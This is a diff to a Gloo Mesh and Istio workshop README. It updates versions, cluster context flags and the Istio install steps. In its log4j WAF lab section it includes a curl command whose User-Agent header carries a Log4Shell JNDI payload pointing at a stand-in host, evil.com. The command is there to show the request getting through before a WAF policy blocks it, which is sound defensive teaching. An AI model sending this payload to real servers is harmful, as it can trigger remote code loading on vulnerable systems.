@@ -54,7 +54,7 @@ Set these environment variables which will be used throughout the workshop.
 ```sh
 # Used to enable Gloo Mesh (please ask for a trail license key)
 export GLOO_MESH_LICENSE_KEY=<licence_key>
-export GLOO_MESH_VERSION=v2.1.0-rc3
+export GLOO_MESH_VERSION=v2.1.0
 
 # Istio version information
 export ISTIO_IMAGE_REPO=us-docker.pkg.dev/gloo-mesh/istio-workshops
@@ -116,7 +116,7 @@ meshctl install \
   --license $GLOO_MESH_LICENSE_KEY
 ```
 
-The management server exposes a grpc endpoint (`kubectl get svc gloo-mesh-mgmt-server -n gloo-mesh`) which the agents in the workload clusters will connect to.
+The management server exposes a grpc endpoint (`kubectl get svc gloo-mesh-mgmt-server -n gloo-mesh --context $MGMT`) which the agents in the workload clusters will connect to.
 
 Use `meshctl` to install the Gloo Mesh agent in the service mesh clusters and register them with the Gloo Mesh management plane. When a cluster is registered with the management plane, the agent is configured with the token and certificate to securely connect to the Gloo Mesh management plane via mutual TLS (mTLS).
 
@@ -158,7 +158,7 @@ Checking Gloo Mesh Management Cluster Installation
 +----------+------------+--------------------------------------------------+
 ```
 
-5. In addition, you can verify proper installation by opening the Gloo Mesh Dashboard. Click [here](problems-dashboard.md) if that command did not work. It's best to run this command in a separate terminal.
+5. In addition, you can verify proper installation by opening the Gloo Mesh Dashboard. It's best to run this command in a separate terminal.
 
 ```sh
 meshctl dashboard --kubecontext $MGMT
@@ -176,16 +176,10 @@ export PATH=$PWD/istio-${ISTIO_VERSION}/bin:$PATH
 istioctl version
 ```
 
-2. Install Istio to each of the remote clusters. If you're using local Kubernetes clusters on a Mac M1 or M2, use [these ARM instructions](problems-istio-arm.md) instead.
+2. Install Istio to each of the remote clusters using Gloo Mesh IstioLifcycleManager and GatewayLifcycleManager.
 
 ```sh
-kubectl create namespace istio-ingress --context $CLUSTER1
-kubectl create namespace istio-eastwest --context $CLUSTER1
-istioctl install --set hub=$ISTIO_IMAGE_REPO --set tag=$ISTIO_IMAGE_TAG  -y --context $CLUSTER1 -f install/istio/istiooperator-cluster1.yaml
-
-kubectl create namespace istio-ingress --context $CLUSTER2
-kubectl create namespace istio-eastwest --context $CLUSTER2
-istioctl install --set hub=$ISTIO_IMAGE_REPO --set tag=$ISTIO_IMAGE_TAG  -y --context $CLUSTER2 -f install/istio/istiooperator-cluster2.yaml
+kubectl apply -f install/istio/gm-istio.yaml --context $MGMT
 ```
 
 3. Verify in the Gloo Mesh Dashboard that the deployed Istio information was discovered.
@@ -702,7 +696,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
+curl -ikI -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
 ```
 
 3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
